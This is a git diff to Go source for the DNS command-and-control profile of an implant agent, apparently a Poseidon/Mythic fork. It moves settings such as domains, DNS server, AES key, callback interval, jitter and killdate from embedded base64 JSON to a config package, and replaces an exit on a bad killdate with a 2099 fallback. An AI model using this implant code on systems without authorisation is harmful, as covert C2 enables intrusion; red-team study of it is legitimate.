@@ -14,6 +14,7 @@ import (
 	"slices"
 
 	"github.com/golang/protobuf/proto"
+	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/config"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/profiles/dnsgrpc"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/responses"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils"
@@ -30,24 +31,6 @@ import (
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/crypto"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/structs"
 )
-
-// base64 encoded version of the JSON initial configuration of HTTP
-var dns_initial_config string
-
-type DNSInitialConfig struct {
-	Domains                []string `json:"domains"`
-	DomainRotation         string   `json:"domain_rotation"`
-	DNSServer              string   `json:"dns_server"`
-	FailoverThreshold      int      `json:"failover_threshold"`
-	RecordType             string   `json:"record_type"`
-	MaxQueryLength         uint32   `json:"max_query_length"`
-	Killdate               string   `json:"killdate"`
-	Interval               uint     `json:"callback_interval"`
-	Jitter                 uint     `json:"callback_jitter"`
-	EncryptedExchangeCheck bool     `json:"encrypted_exchange_check"`
-	AESPSK                 string   `json:"AESPSK"`
-	MaxSubdomainLength     uint32   `json:"max_subdomain_length"`
-}
 
 type C2DNS struct {
 	Domains               []string `json:"Domains"`
@@ -85,71 +68,62 @@ type DnsMessageStream struct {
 var dnsUDPClient = new(dns.Client)
 var dnsTCPClient = new(dns.Client)
 
-// New creates a new HTTP C2 profile from the package's global variables and returns it
 func init() {
-	initialConfigBytes, err := base64.StdEncoding.DecodeString(dns_initial_config)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to decode initial dns config, exiting: %v\n", err))
-		os.Exit(1)
-	}
-	initialConfig := DNSInitialConfig{}
-	err = json.Unmarshal(initialConfigBytes, &initialConfig)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial dns config, exiting: %v\n", err))
-		os.Exit(1)
-	}
-	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", config.DNSKilldate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
 	if err != nil {
-		os.Exit(1)
+		utils.PrintDebug(fmt.Sprintf("error parsing killdate, using far future: %v\n", err))
+		killDateTime = time.Date(2099, 12, 31, 0, 0, 0, 0, time.UTC)
 	}
+
 	profile := C2DNS{
-		Domains:               initialConfig.Domains,
+		Domains:               config.DNSDomains,
 		DomainLengths:         make(map[string]uint32),
 		DomainErrors:          make(map[string]int),
-		DNSServer:             initialConfig.DNSServer,
-		DomainRotation:        initialConfig.DomainRotation,
-		FailoverThreshold:     initialConfig.FailoverThreshold,
+		DNSServer:             config.DNSServer,
+		DomainRotation:        config.DNSDomainRotation,
+		FailoverThreshold:     config.DNSFailoverThreshold,
 		CurrentDomain:         0,
-		Key:                   initialConfig.AESPSK,
-		RecordType:            initialConfig.RecordType,
-		MaxQueryLength:        initialConfig.MaxQueryLength,
+		Key:                   config.DNSAesPsk,
+		RecordType:            config.DNSRecordType,
+		MaxQueryLength:        uint32(config.DNSMaxQueryLength),
 		Killdate:              killDateTime,
 		ShouldStop:            true,
 		stoppedChannel:        make(chan bool, 1),
 		interruptSleepChannel: make(chan bool, 1),
 		AgentSessionID:        rand.Uint32(),
 		udpChunkSize:          512,
-		maxSubdomainLength:    initialConfig.MaxSubdomainLength,
+		maxSubdomainLength:    uint32(config.DNSMaxSubdomainLength),
 		tcpConn:               nil,
 	}
-	for _, domain := range initialConfig.Domains {
+
+	for _, domain := range config.DNSDomains {
 		profile.DomainLengths[domain] = profile.getMaxLengthPerMessage(domain)
 		profile.DomainErrors[domain] = 0
 	}
+
 	if profile.DNSServer == "" {
 		profile.DNSServer = "8.8.8.8:53"
 	}
 	if profile.MaxQueryLength >= 255 {
-		profile.MaxQueryLength = 254 // can't go past this
+		profile.MaxQueryLength = 254
 	}
 	if profile.maxSubdomainLength > 63 || profile.maxSubdomainLength <= 0 {
-		profile.maxSubdomainLength = 63 // can't go past this
+		profile.maxSubdomainLength = 63
 	}
 
-	// Convert sleep from string to integer
-	profile.Interval = int(initialConfig.Interval)
+	profile.Interval = config.DNSInterval
 	if profile.Interval < 0 {
 		profile.Interval = 0
 	}
 
-	// Convert jitter from string to integer
-	profile.Jitter = int(initialConfig.Jitter)
+	profile.Jitter = config.DNSJitter
 	if profile.Jitter < 0 {
 		profile.Jitter = 0
 	}
 
-	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
+	profile.ExchangingKeys = config.DNSEncryptedExchange
+
 	dnsUDPClient.Dialer = &net.Dialer{
 		Timeout: 5 * time.Second,
 	}
@@ -159,6 +133,7 @@ func init() {
 	}
 	dnsTCPClient.Net = "tcp"
 	dnsTCPClient.UDPSize = 4096
+
 	RegisterAvailableC2Profile(&profile)
 }
 func (c *C2DNS) Sleep() {
